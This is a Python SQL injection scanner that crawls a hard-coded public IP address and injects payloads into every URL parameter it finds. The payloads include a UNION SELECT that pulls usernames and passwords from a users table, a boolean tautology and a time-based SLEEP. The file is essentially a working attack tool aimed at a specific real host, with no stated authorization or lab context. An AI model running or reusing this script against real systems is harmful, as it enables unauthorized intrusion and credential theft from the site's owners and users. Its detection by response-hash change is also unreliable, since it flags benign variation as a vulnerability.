#!/usr/bin/env python3
"""
SQLi Scanner - Crawls & tests all URL parameters for injection vulnerabilities.
Target: http://52.247.225.51
Output: Only vulnerable URLs at the end.
Python 3.8+ | pip install requests
"""

import requests
from urllib.parse import urlparse, parse_qs, urljoin
import re
import time
import hashlib
import concurrent.futures

# ================= CONFIGURATION =================
TARGET = "http://52.247.225.51"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SQLi-Scanner",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
}
TIMEOUT = 12

# Payloads to test (requests auto URL-encodes them)
PAYLOADS = [
    "' UNION SELECT 1, username, password, 9.99, 'script.js' FROM users --",
    "' OR '1'='1",
    f"' AND SLEEP(4)--",
    "' UNION SELECT NULL--"
]

# ================= CRAWLER =================
def crawl(base_url):
    visited = set()
    queue = [(base_url, 0)]
    params_to_test = []
    netloc = urlparse(base_url).netloc

    while queue:
        url, depth = queue.pop(0)
        if url in visited or depth > 3:
            continue
        visited.add(url)

        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        for k, v_list in params.items():
            params_to_test.append((url, k, v_list[0]))

        try:
            resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT)
            if resp.status_code == 200 and resp.text:
                links = re.findall(r'href=["\']([^"\']+)["\']', resp.text)
                for link in links:
                    full = urljoin(base_url, link)
                    p = urlparse(full)
                    if (p.netloc == netloc and 
                        p.scheme in ('http','https') and 
                        '#' not in full):
                        queue.append((full, depth + 1))
        except Exception:
            continue

    return params_to_test

# ================= TESTER =================
def test_param(args):
    url, param_name, original_val = args
    
    try:
        baseline_resp = requests.get(url, params={param_name: original_val}, headers=HEADERS, timeout=TIMEOUT)
        if baseline_resp.status_code != 200:
            return None
        baseline_hash = hashlib.md5(baseline_resp.text.encode()).hexdigest()
    except Exception:
        return None

    for payload in PAYLOADS:
        test_params = {param_name: f"{original_val}{payload}"}
        try:
            resp = requests.get(url, params=test_params, headers=HEADERS, timeout=TIMEOUT)
            
            # 1. Status code change (e.g., 200 → 500)
            if resp.status_code != baseline_resp.status_code:
                return url
            
            # 2. Content hash change (catches ANY response modification from UNION/Boolean SQLi)
            test_hash = hashlib.md5(resp.text.encode()).hexdigest()
            if baseline_hash != test_hash:
                return url
                
        except Exception:
            continue

    # Time-based fallback
    time_params = {param_name: f"{original_val} AND SLEEP(4)--"}
    start = time.time()
    requests.get(url, params=time_params, headers=HEADERS, timeout=TIMEOUT + 5)
    if time.time() - start > 3.0:
        return url

    return None

# ================= MAIN EXECUTION =================
def main():
    print(f"[*] Crawling {TARGET}...")
    crawled_targets = crawl(TARGET)
    
    # Force-test common search endpoints even if crawler misses them
    direct_targets = []
    for path in ["/", "/search"]:
        base_url = f"{TARGET}{path}" if path != "/" else TARGET
        for val in ["", " ", "test"]:
            direct_targets.append((base_url, "q", val))
            
    all_targets = crawled_targets + direct_targets
    print(f"[+] Found {len(all_targets)} parameters to test.\n")

    vuln_urls = set()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(test_param, args) for args in all_targets]
        
        completed = 0
        total = len(futures)
        for f in concurrent.futures.as_completed(futures):
            result_url = f.result()
            if result_url:
                vuln_urls.add(result_url)
            
            completed += 1
            print(f"\r[+] Scanned {completed}/{total} parameters...", end="", flush=True)

    # ================= CLEAN OUTPUT =================
    print("\n\n" + "="*50)
    print("VULNERABLE URLs FOUND:")
    print("="*50)
    for u in sorted(vuln_urls):
        print(u)
    
    if not vuln_urls:
        print("[+] No SQLi vulnerabilities detected.")

if __name__ == "__main__":
    main()
